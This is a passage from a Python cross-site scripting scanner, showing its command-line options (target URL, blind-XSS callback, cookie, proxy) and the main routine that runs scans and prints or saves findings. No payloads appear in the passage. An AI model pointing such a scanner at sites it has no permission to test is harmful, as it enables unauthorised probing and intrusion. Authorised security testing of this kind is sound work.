        epilog="""
Examples:
    %(prog)s -t "https://example.com/search?q=test"
    %(prog)s -t "https://example.com/api" --json '{"query":"test"}'
    %(prog)s -t "https://example.com/page?id=1" --no-stored -v

Author: REVUEX Team
License: MIT
        """
    )
    
    parser.add_argument("-t", "--target", required=True, help="Target URL")
    parser.add_argument("--json", type=json.loads, default={}, help="JSON body for POST requests")
    parser.add_argument("--callback", default="", help="Callback URL for blind XSS")
    parser.add_argument("--no-methods", action="store_true", help="Don't test multiple HTTP methods")
    parser.add_argument("--no-stored", action="store_true", help="Skip stored XSS testing")
    parser.add_argument("--no-headers", action="store_true", help="Skip blind header XSS testing")
    parser.add_argument("--no-dom", action="store_true", help="Skip DOM XSS testing")
    parser.add_argument("-o", "--output", help="Output file (JSON)")
    parser.add_argument("--delay", type=float, default=0.5, help="Request delay (default: 0.5)")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout (default: 10)")
    parser.add_argument("--proxy", help="HTTP proxy")
    parser.add_argument("--cookie", help="Cookie string")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument("-q", "--quiet", action="store_true", help="Quiet mode")
    
    return parser


def main() -> int:
    """Main entry point."""
    parser = create_parser()
    args = parser.parse_args()
    
    if not args.quiet:
        print(f"""
╔═══════════════════════════════════════════════════════════╗
║  REVUEX XSS Scanner v{SCANNER_VERSION}-GOLD                         ║
║  Research-Grade XSS Detection Engine                     ║
╚═══════════════════════════════════════════════════════════╝
        """)
    
    scanner = XSSScanner(
        target=args.target,
        json_body=args.json,
        test_methods=not args.no_methods,
        test_stored=not args.no_stored,
        test_blind_headers=not args.no_headers,
        test_dom=not args.no_dom,
        callback_url=args.callback,
        delay=args.delay,
        timeout=args.timeout,
        proxy=args.proxy,
        verbose=args.verbose,
    )
    
    if args.cookie:
        scanner.session.headers["Cookie"] = args.cookie
    
    result = scanner.run()
    
    if not args.quiet:
        print(f"\n{'='*60}")
        print("SCAN COMPLETE")
        print(f"{'='*60}")
        print(f"Target: {args.target}")
        print(f"Duration: {result.duration_seconds:.2f}s")
        print(f"Requests: {result.total_requests}")
        print(f"Findings: {len(result.findings)}")
        
        if scanner.csp_info.get("present"):
            print(f"CSP: Present")
        else:
            print(f"CSP: Missing")
        
        if result.findings:
            print(f"\n{'='*60}")
            print("FINDINGS SUMMARY")
            print(f"{'='*60}")
            for finding in result.findings:
                sev_colors = {
                    Severity.CRITICAL: "\033[95m",
                    Severity.HIGH: "\033[91m",
                    Severity.MEDIUM: "\033[93m",
                    Severity.LOW: "\033[94m",
                }
                color = sev_colors.get(finding.severity, "")
                reset = "\033[0m"
                print(f"\n{color}[{finding.severity.value.upper()}]{reset} {finding.title}")
                print(f"  Parameter: {finding.parameter}")
                if hasattr(finding, 'method') and finding.method:
                    print(f"  Method: {finding.method}")
    
    if args.output:
        output_data = {
            "scanner": "REVUEX XSS GOLD",
            "version": SCANNER_VERSION,
            "target": args.target,
            "scan_id": result.scan_id,
            "duration": result.duration_seconds,
            "csp_info": scanner.csp_info,
            "findings": [
                {
                    "id": f.id,
                    "title": f.title,
                    "severity": f.severity.value,
                    "parameter": f.parameter,
                    "method": getattr(f, "method", "GET"),
                    "payload": f.payload,
                    "evidence": f.evidence,
                    "remediation": f.remediation,
                }
                for f in result.findings
            ]
        }
        
        with open(args.output, "w") as f:
            json.dump(output_data, f, indent=2)
        
        if not args.quiet:
            print(f"\nResults saved to: {args.output}")
    
    return 1 if result.findings else 0


if __name__ == "__main__":
    sys.exit(main())
